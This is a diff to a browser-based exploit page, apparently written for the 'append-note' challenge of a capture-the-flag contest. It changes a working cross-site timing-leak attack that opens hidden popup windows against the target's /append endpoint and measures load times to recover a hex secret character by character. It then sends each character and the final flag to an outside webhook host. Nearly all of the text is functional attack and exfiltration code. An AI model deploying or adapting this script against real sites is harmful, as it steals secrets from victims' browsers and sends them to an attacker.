@@ -17,13 +17,13 @@ body { background: #0d1117; color: #c9d1d9; font-family: monospace; padding: 16p
 <div id="log"></div>
 
 <script>
-const TARGET = "https://append-note-6e7zv.instancer.lac.tf";
+const TARGET = "https://append-note-4e86a.instancer.lac.tf";
 const WEBHOOK = "https://crimson-griffin-76.webhook.cool";
 const CHARS = "0123456789abcdef";
 
-const PROBE_TIMEOUT_MS = 380;
-const BETWEEN_PROBES_MS = 15;
-const CAL_SAMPLES = 3;
+const PROBE_TIMEOUT_MS = 420;
+const BETWEEN_PROBES_MS = 25;
+const CAL_SAMPLES = 4;
 
 const $ = (id) => document.getElementById(id);
 const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
@@ -53,12 +53,12 @@ function median(arr) {
     return a[Math.floor(a.length / 2)];
 }
 
-function make404Sample(i) {
+function make404Sample(tag) {
     // Any prefix containing non-hex chars can never match the secret.
-    return "g" + i + Math.random().toString(16).slice(2);
+    return "g" + tag + Math.random().toString(16).slice(2);
 }
 
-async function probeOnce(prefix) {
+async function probePrefix(prefix) {
     const url = `${TARGET}/append?content=${encodeURIComponent(prefix)}&url=${encodeURIComponent(TARGET + "/")}`;
     return new Promise((resolve) => {
         const t0 = performance.now();
@@ -66,8 +66,7 @@ async function probeOnce(prefix) {
         const finish = (reason) => {
             if (done) return;
             done = true;
-            const t = performance.now() - t0;
-            resolve({ time: t, reason });
+            resolve({ time: performance.now() - t0, reason });
         };
 
         const w = window.open(url, "p" + Math.random(), "width=1,height=1,left=-9999,top=-9999");
@@ -77,7 +76,6 @@ async function probeOnce(prefix) {
         }
 
         const timer = setTimeout(() => finish("timeout"), PROBE_TIMEOUT_MS);
-
         try {
             w.addEventListener("load", () => {
                 clearTimeout(timer);
@@ -102,13 +100,13 @@ async function calibrate() {
     const t404 = [];
 
     for (let i = 0; i < CAL_SAMPLES; i++) {
-        const r200 = await probeOnce("");
+        const r200 = await probePrefix("");
         t200.push(r200.time);
         await sleep(BETWEEN_PROBES_MS);
     }
 
     for (let i = 0; i < CAL_SAMPLES; i++) {
-        const r404 = await probeOnce(make404Sample(i));
+        const r404 = await probePrefix(make404Sample("c" + i));
         t404.push(r404.time);
         await sleep(BETWEEN_PROBES_MS);
     }
@@ -134,19 +132,23 @@ async function findSecret(matchFaster) {
 
         const results = [];
         for (const c of CHARS) {
-            const r = await probeOnce(secret + c);
-            results.push({ c, t: r.time, reason: r.reason });
+            const tCandidate = await probePrefix(secret + c);
+            await sleep(BETWEEN_PROBES_MS);
+            const tControl = await probePrefix(make404Sample("p" + pos + c));
+
+            const delta = tCandidate.time - tControl.time;
+            results.push({ c, tc: tCandidate.time, t0: tControl.time, d: delta });
             await sleep(BETWEEN_PROBES_MS);
         }
 
-        results.sort((a, b) => a.t - b.t);
+        results.sort((a, b) => a.d - b.d);
         const winner = matchFaster ? results[0] : results[results.length - 1];
-        const top3 = results.slice(0, 3).map(r => `${r.c}:${r.t.toFixed(1)}`).join(" ");
-        const bot3 = results.slice(-3).map(r => `${r.c}:${r.t.toFixed(1)}`).join(" ");
 
-        log(`Top: ${top3}`, "ok");
-        log(`Bottom: ${bot3}`, "ok");
-        log(`Winner: ${winner.c} (${winner.t.toFixed(2)}ms)`, "warn");
+        const top3 = results.slice(0, 3).map(r => `${r.c}:${r.d.toFixed(1)}`).join(" ");
+        const bot3 = results.slice(-3).map(r => `${r.c}:${r.d.toFixed(1)}`).join(" ");
+        log(`Delta top: ${top3}`, "ok");
+        log(`Delta bot: ${bot3}`, "ok");
+        log(`Winner: ${winner.c} (d=${winner.d.toFixed(2)}ms)`, "warn");
 
         secret += winner.c;
         report(`POS${pos}=${winner.c} SECRET=${secret}`);
@@ -182,7 +184,7 @@ async function main() {
     report(`FLAG=${flag.text}`);
 
     if (!flag.ok) {
-        log("Flag check failed. Try re-running with a fresh instance.", "err");
+        log("Flag check failed. Re-run with a fresh instance.", "err");
         setStatus("Failed to fetch flag (see log).");
         return;
     }
